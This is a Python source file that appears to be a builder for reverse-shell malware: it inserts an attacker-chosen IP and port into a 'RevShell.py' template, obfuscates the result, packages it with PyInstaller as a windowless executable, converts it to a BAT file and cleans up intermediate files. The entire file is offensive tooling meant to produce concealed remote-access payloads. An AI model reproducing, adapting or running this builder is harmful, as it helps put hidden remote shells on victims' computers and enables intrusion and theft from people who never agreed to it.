import os
import sys
import base64
import subprocess
import platform

def replace_ip_and_port(code, ip, port):
    old_ip_port = "('129.159.135.500', 80)"
    new_ip_port = f"('{ip}', {port})"
    updated_code = code.replace(old_ip_port, new_ip_port)
    return updated_code

def create_file(ip, port, filename):
    while filename == 'RevShell.py':
        print('Error: The filename cannot be RevShell.py')
        sys.exit()

    # Read the original code from the template file
    with open('RevShell.py', 'r') as f:
        code = f.read()

    # Replace the IP and port in the code
    code = replace_ip_and_port(code, ip, port)

    # Write the modified code to a new file with the given filename
    with open(filename, 'w') as f:
        f.write(code)

def build_exe(filename):
    # Build the executable file using PyInstaller
    cmd = f"python3 compress.py {filename} {filename}Obf.py"
    subprocess.run(cmd, shell=True, check=True)
    cmd = f"pyinstaller --onefile --noconsole --hidden-import cryptography {filename}Obf.py"
    subprocess.run(cmd, shell=True, check=True)

def create_bat(filenameOBF):
    # Run Py2batConvert.py to create the BAT file
    cmd = f"python3 Py2batConvert.py {filenameOBF}"
    subprocess.run(cmd, shell=True, check=True)

if __name__ == '__main__':
    # Get the IP, port, and filename from the command line arguments
    ip = sys.argv[1]
    port = sys.argv[2]
    filename = sys.argv[3]
    filenameOBF = filename + "Obf.py"

    # Create the Python file with the modified IP and port
    create_file(ip, port, filename)

    # Build the executable file using PyInstaller
    build_exe(filename)

    # Execute Py2batConvert.py to create the BAT file
    create_bat_cmd = f"python3 Py2batConvert.py {filenameOBF}"
    subprocess.run(create_bat_cmd, shell=True, check=True)

    # Remove unnecessary files	
    if platform.system() == 'Windows':
        cmd = f"del {filename}Obf.spec"
        subprocess.run(cmd, shell=True, check=True)
        cmd = f"del {filename}"
        subprocess.run(cmd, shell=True, check=True)
    else:
        cmd = f"rm -rf {filename}Obf.spec"
        subprocess.run(cmd, shell=True, check=True)
        cmd = f"rm -rf {filename}"
        subprocess.run(cmd, shell=True, check=True)
        # Granting Permissions	
        if platform.system() == 'Linux':
            cmd = f"chmod +777 {filename}Obf.py"
            subprocess.run(cmd, shell=True, check=True)
